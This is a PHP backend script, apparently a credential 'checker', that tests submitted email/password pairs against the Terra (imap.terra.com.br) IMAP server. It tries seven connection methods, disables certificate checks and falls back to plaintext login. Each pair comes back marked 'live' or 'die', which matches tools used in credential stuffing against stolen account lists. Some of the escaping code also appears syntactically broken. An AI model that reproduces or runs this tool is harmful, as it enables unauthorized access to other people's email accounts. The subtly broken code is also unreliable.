<?php
/**
 * api.php — Backend Kroenen Engine Checker
 * SEM session_start() · 7 métodos de conexão IMAP · FormData
 */
error_reporting(0);
ini_set('display_errors', '0');
ini_set('session.use_cookies', '0');
ini_set('max_execution_time', '30');

$action = $_GET['action'] ?? '';

// ── INIT ──
if ($action === 'init') {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    echo json_encode(['status' => 'ok', 'proxies' => []]);
    exit;
}

// ── PING ──
if ($action === 'ping') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'status' => 'ok',
        'time'   => date('Y-m-d H:i:s'),
        'php'    => PHP_VERSION,
        'exts'   => [
            'curl'    => extension_loaded('curl'),
            'openssl' => extension_loaded('openssl'),
            'imap'    => extension_loaded('imap'),
        ],
    ]);
    exit;
}

// ── DIAGNOSTIC ──
if ($action === 'diagnostic') {
    header('Content-Type: application/json; charset=utf-8');
    $r = ['server' => 'imap.terra.com.br', 'php' => PHP_VERSION, 'tests' => []];

    $ips = @gethostbynamel('imap.terra.com.br');
    $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
    if (empty($ips)) { $r['tests']['dns']['err'] = 'DNS falhou'; echo json_encode($r, 128); exit; }

    $t = microtime(true);
    $tcp = @fsockopen($ips[0], 993, $e, $s, 8);
    $r['tests']['tcp_993'] = ['ok' => $tcp !== false, 'ms' => round((microtime(true) - $t) * 1000)];
    if ($tcp === false) { $r['tests']['tcp_993']['err'] = "errno={$e}; {$s}"; }
    else { fclose($tcp); }

    $t = microtime(true);
    $tcp2 = @fsockopen($ips[0], 143, $e2, $s2, 8);
    $r['tests']['tcp_143'] = ['ok' => $tcp2 !== false, 'ms' => round((microtime(true) - $t) * 1000)];
    if ($tcp2 === false) { $r['tests']['tcp_143']['err'] = "errno={$e2}; {$s2}"; }
    else { fclose($tcp2); }

    if ($tcp !== false) {
        $t = microtime(true);
        $ssl = @fsockopen('ssl://imap.terra.com.br', 993, $e3, $s3, 8);
        $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true) - $t) * 1000)];
        if ($ssl) {
            stream_set_timeout($ssl, 8);
            $g = @fgets($ssl, 8192);
            $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
            $r['tests']['ssl_993']['imap_ok'] = ($g && stripos($g, 'OK') !== false);
            fclose($ssl);
        } else {
            $r['tests']['ssl_993']['err'] = "errno={$e3}; {$s3}";
        }
    }

    if (extension_loaded('curl')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'imaps://imap.terra.com.br:993/',
            CURLOPT_USERNAME => 'test@test.com',
            CURLOPT_PASSWORD => 'test',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 8,
            CURLOPT_CONNECTTIMEOUT => 8,
            CURLOPT_NOSIGNAL => 1,
        ]);
        $res = curl_exec($ch);
        $r['tests']['curl'] = ['ok' => $res !== false, 'err' => curl_error($ch)];
        curl_close($ch);
    }

    $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
    echo json_encode($r, 128 | 256);
    exit;
}

// ── CHECK ──
if ($action === 'check') {
    header('Content-Type: application/json; charset=utf-8');
    header('Access-Control-Allow-Origin: *');

    $email    = $_POST['email']    ?? '';
    $password = $_POST['password'] ?? '';

    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }

    echo json_encode(doValidate($email, $password));
    exit;
}

// ── DEFAULT ──
header('Content-Type: application/json; charset=utf-8');
echo json_encode(['status' => 'ok']);
exit;

// ═══════════════════════════════════════════
//  FUNÇÕES DE VALIDAÇÃO IMAP
// ═══════════════════════════════════════════

function doValidate(string $email, string $password): array {
    $start   = microtime(true);
    $timeout = 10;
    $debug   = [];

    // 1: cURL
    if (extension_loaded('curl')) {
        $r = mCurl($email, $password, $timeout, $start, $debug);
        if ($r !== null) return $r;
    }

    // 2: fsockopen ssl://
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'fsock_ssl', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else { $debug[] = "fsock(ssl:993):{$errno}/{$errstr}"; }

    // 3: stream ssl://
    $ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true]]);
    $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'stream_ssl', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else { $debug[] = "stream(ssl:993):{$errno}/{$errstr}"; }

    // 4: stream tls://
    $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'stream_tls', $debug, $timeout, $start, true);
        if ($r !== null) return $r;
    } else { $debug[] = "stream(tls:993):{$errno}/{$errstr}"; }

    // 5: STARTTLS 143
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket !== false) {
        stream_set_timeout($socket, $timeout);
        $greeting = @fgets($socket, 8192);
        if ($greeting && stripos($greeting, 'OK') !== false) {
            fwrite($socket, "A001 STARTTLS\r\n");
            $resp = readUntilTag($socket, 'A001', $timeout);
            if ($resp && preg_match('/A001\s+OK/i', $resp)) {
                $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                if ($crypto === true) {
                    $r = imapLogin($socket, $email, $password, 'starttls', $debug, $timeout, $start, false);
                    if ($r !== null) return $r;
                } else { $debug[] = 'starttls:crypto fail'; fclose($socket); }
            } else { $debug[] = 'starttls:rejected'; fclose($socket); }
        } else { $debug[] = '143:greeting fail'; fclose($socket); }
    } else { $debug[] = "fsock(tcp:143):{$errno}/{$errstr}"; }

    // 6: Plain 143
    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
    if ($socket !== false) {
        $r = imapLogin($socket, $email, $password, 'plain143', $debug, $timeout, $start, false);
        if ($r !== null) return $r;
    } else { $debug[] = "fsock(plain:143):{$errno}/{$errstr}"; }

    // 7: imap_open
    if (extension_loaded('imap')) {
        $conn = @imap_open('{imap.terra.com.br:993/imap/ssl/novalidate-cert}', $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            @imap_close($conn);
            return ['status' => 'live', 'email' => $email, 'reason' => 'OK', 'method' => 'imap_ext', 'mailbox_messages' => $info->Nmsgs ?? 0, 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
        }
        $err = @imap_last_error();
        $debug[] = "imap_open:{$err}";
        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials', 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2), 'debug' => implode(' | ', $debug)];
}

function mCurl(string $email, string $password, int $timeout, float $start, array &$debug): ?array {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME       => $email,
        CURLOPT_PASSWORD       => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL       => 1,
    ]);
    $result = curl_exec($ch);
    $err    = curl_error($ch);
    curl_close($ch);

    if ($result !== false) {
        $debug[] = 'curl:OK';
        return ['status' => 'live', 'email' => $email, 'reason' => 'OK', 'method' => 'curl', 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
    }
    $el = strtolower($err);
    $debug[] = "curl:{$err}";
    if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false || strpos($el, 'credential') !== false) {
        return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials', 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
    }
    return null;
}

function imapLogin($socket, string $email, string $password, string $method, array &$debug, int $timeout, float $start, bool $read_greeting): ?array {
    stream_set_timeout($socket, $timeout);

    if ($read_greeting) {
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || $greeting === '') { fclose($socket); $debug[] = "{$method}:greeting vazio"; return null; }
        if (stripos($greeting, 'OK') === false) { fclose($socket); $debug[] = "{$method}:greeting sem OK"; return null; }
    }

    $tag = 'L001';
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");

    $response = readUntilTag($socket, $tag, $timeout);
    $meta = stream_get_meta_data($socket);

    if ($response === null || $response === '') { fclose($socket); $debug[] = "{$method}:resp vazia"; return null; }
    if (!empty($meta['timed_out'])) { fclose($socket); $debug[] = "{$method}:timeout"; return null; }

    $qt = preg_quote($tag, '/');

    if (preg_match('/' . $qt . '\s+OK/i', $response)) {
        @fwrite($socket, "X001 LOGOUT\r\n");
        fclose($socket);
        $debug[] = "{$method}:OK";
        return ['status' => 'live', 'email' => $email, 'reason' => 'OK', 'method' => $method, 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
    }
    if (preg_match('/' . $qt . '\s+NO/i', $response)) {
        fclose($socket);
        return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials', 'elapsed_ms' => round((microtime(true) - $start) * 1000, 2)];
    }
    if (preg_match('/' . $qt . '\s+BAD/i', $response)) { fclose($socket); $debug[] = "{$method}:BAD"; return null; }

    fclose($socket);
    $debug[] = "{$method}:inesperado";
    return null;
}

function readUntilTag($socket, string $tag, int $timeout): ?string {
    $buffer = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $buffer .= $line;
        if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
        $meta = stream_get_meta_data($socket);
        if (!empty($meta['timed_out'])) break;
        if (microtime(true) > $deadline) break;
    }
    return $buffer !== '' ? $buffer : null;
}
